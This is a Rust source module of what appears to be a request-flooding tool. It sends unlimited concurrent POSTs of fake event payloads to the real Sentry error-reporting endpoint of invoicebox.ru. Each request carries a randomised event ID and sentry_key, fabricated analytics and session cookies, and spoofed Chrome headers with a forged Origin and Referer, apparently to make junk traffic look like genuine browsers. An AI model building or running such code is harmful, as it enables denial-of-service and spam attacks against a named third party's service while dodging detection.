use crate::console::Log;
use crate::util::{brief, concurrency, discard_unread, random_hex32, rand_u64, push_token, Summary};
use bytes::Bytes;
use reqwest::header::{
    HeaderMap, HeaderName, HeaderValue, ACCEPT, ACCEPT_LANGUAGE, CONTENT_TYPE, COOKIE, ORIGIN,
    REFERER, USER_AGENT,
};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, OnceLock};
use tokio::sync::watch;
use tokio::task::JoinSet;

const URL_PREFIX: &str = "https://sentry.invoicebox.ru/api/2/store/?sentry_key=";
const URL_SUFFIX: &str = "&sentry_version=7";

pub async fn run(
    client: reqwest::Client,
    template: Arc<Vec<u8>>,
    event_at: usize,
    n: u64,
    stop: watch::Receiver<bool>,
    log: Log,
) -> Summary {
    let conc = concurrency();
    let ok = Arc::new(AtomicU64::new(0));
    let fail = Arc::new(AtomicU64::new(0));
    let mut set = JoinSet::new();
    let mut started = 0u64;

    loop {
        if *stop.borrow() || (n > 0 && started >= n) {
            break;
        }
        while set.len() >= conc {
            let _ = set.join_next().await;
            if *stop.borrow() {
                break;
            }
        }
        if *stop.borrow() || (n > 0 && started >= n) {
            break;
        }
        started += 1;
        let attempt = started;
        let client = client.clone();
        let template = Arc::clone(&template);
        let mut stop_r = stop.clone();
        let log = log.clone();
        let ok = Arc::clone(&ok);
        let fail = Arc::clone(&fail);
        set.spawn(async move {
            tokio::select! {
                _ = stop_r.wait_for(|flag| *flag) => {}
                hit = once(&client, &template, event_at, attempt) => {
                    if hit.ok {
                        ok.fetch_add(1, Ordering::Relaxed);
                    } else {
                        fail.fetch_add(1, Ordering::Relaxed);
                    }
                    log.line(hit.line);
                }
            }
        });
    }

    while set.join_next().await.is_some() {}
    Summary {
        ok: ok.load(Ordering::Relaxed),
        fail: fail.load(Ordering::Relaxed),
    }
}

struct Hit {
    ok: bool,
    line: String,
}

async fn once(client: &reqwest::Client, template: &[u8], event_at: usize, attempt: u64) -> Hit {
    let body = Bytes::from(payload_with_new_id(template, event_at));
    let url = sentry_url();
    let cookies = random_cookies();
    let headers = match json_headers(&cookies) {
        Ok(headers) => headers,
        Err(err) => {
            return Hit {
                ok: false,
                line: format!("json #{attempt} fail {}", brief(&err)),
            };
        }
    };

    match client.post(&url).headers(headers).body(body).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            discard_unread(resp, 4096).await;
            let ok = status == 200;
            let word = if ok { "ok" } else { "fail" };
            Hit {
                ok,
                line: format!("json #{attempt} {word} {status}"),
            }
        }
        Err(err) => Hit {
            ok: false,
            line: format!("json #{attempt} fail {}", brief(&err.to_string())),
        },
    }
}

pub fn event_id_at(buf: &[u8]) -> Option<usize> {
    const KEY: &[u8] = b"\"event_id\"";
    let mut i = 0usize;
    while i + KEY.len() <= buf.len() {
        if &buf[i..i + KEY.len()] == KEY {
            let mut j = i + KEY.len();
            while j < buf.len() && matches!(buf[j], b' ' | b'\t' | b'\n' | b'\r' | b':') {
                j += 1;
            }
            if j < buf.len() && buf[j] == b'"' {
                let start = j + 1;
                let end = start + 32;
                if end <= buf.len() && buf[start..end].iter().all(|b| b.is_ascii_hexdigit()) {
                    return Some(start);
                }
            }
        }
        i += 1;
    }
    None
}

fn payload_with_new_id(template: &[u8], at: usize) -> Vec<u8> {
    let n = template.len();
    assert!(at.checked_add(32).is_some_and(|end| end <= n));
    let mut buf = Vec::with_capacity(n);
    let id = random_hex32();
    unsafe {
        // SAFETY: capacity is `n` and the vec is empty. the first copy fills
        // exactly `n` bytes. `at..at+32` is inside that range and is overwritten
        // with 32 initialized hex bytes before `set_len`.
        let dst = buf.as_mut_ptr();
        std::ptr::copy_nonoverlapping(template.as_ptr(), dst, n);
        std::ptr::copy_nonoverlapping(id.as_ptr(), dst.add(at), 32);
        buf.set_len(n);
    }
    buf
}

fn sentry_url() -> String {
    let mut buf = Vec::with_capacity(URL_PREFIX.len() + 32 + URL_SUFFIX.len());
    buf.extend_from_slice(URL_PREFIX.as_bytes());
    buf.extend_from_slice(&random_hex32());
    buf.extend_from_slice(URL_SUFFIX.as_bytes());
    // SAFETY: prefix, 32 hex digits, and suffix are ASCII.
    unsafe { String::from_utf8_unchecked(buf) }
}

fn random_cookies() -> String {
    let mut s = String::with_capacity(256);
    use std::fmt::Write as _;
    let _ = write!(
        s,
        "_ym_uid={}; _ym_d={}; _ym_isad=2; _ym_visorc=w; sessionid=",
        rand_u64() % 10_000_000_000_000_000_000u64,
        rand_u64() % 10_000_000_000,
    );
    push_token(&mut s);
    let _ = write!(
        s,
        "; _ga=GA1.1.{}.{}; _gid=GA1.1.{}.{}; csrftoken=",
        rand_u64() % 10_000_000_000,
        rand_u64() % 10_000_000_000,
        rand_u64() % 10_000_000_000,
        rand_u64() % 10_000_000_000,
    );
    s.push_str(std::str::from_utf8(&random_hex32()).unwrap());
    s
}

fn json_headers(cookie: &str) -> Result<HeaderMap, String> {
    let mut headers = base_json_headers().clone();
    headers.insert(
        COOKIE,
        HeaderValue::from_str(cookie).map_err(|err| err.to_string())?,
    );
    Ok(headers)
}

fn base_json_headers() -> &'static HeaderMap {
    static HEADERS: OnceLock<HeaderMap> = OnceLock::new();
    HEADERS.get_or_init(|| {
        let mut h = HeaderMap::with_capacity(12);
        h.insert(
            CONTENT_TYPE,
            HeaderValue::from_static("text/plain;charset=UTF-8"),
        );
        h.insert(ACCEPT, HeaderValue::from_static("*/*"));
        h.insert(
            ACCEPT_LANGUAGE,
            HeaderValue::from_static("en-US,en;q=0.9"),
        );
        h.insert(ORIGIN, HeaderValue::from_static("https://do.invoicebox.ru"));
        h.insert(REFERER, HeaderValue::from_static("https://do.invoicebox.ru/"));
        h.insert(
            USER_AGENT,
            HeaderValue::from_static(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            ),
        );
        insert_static(&mut h, "sec-ch-ua", "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"");
        insert_static(&mut h, "sec-ch-ua-mobile", "?0");
        insert_static(&mut h, "sec-ch-ua-platform", "\"Windows\"");
        insert_static(&mut h, "sec-fetch-dest", "empty");
        insert_static(&mut h, "sec-fetch-mode", "cors");
        insert_static(&mut h, "sec-fetch-site", "same-site");
        h
    })
}

fn insert_static(headers: &mut HeaderMap, name: &'static str, value: &'static str) {
    headers.insert(HeaderName::from_static(name), HeaderValue::from_static(value));
}
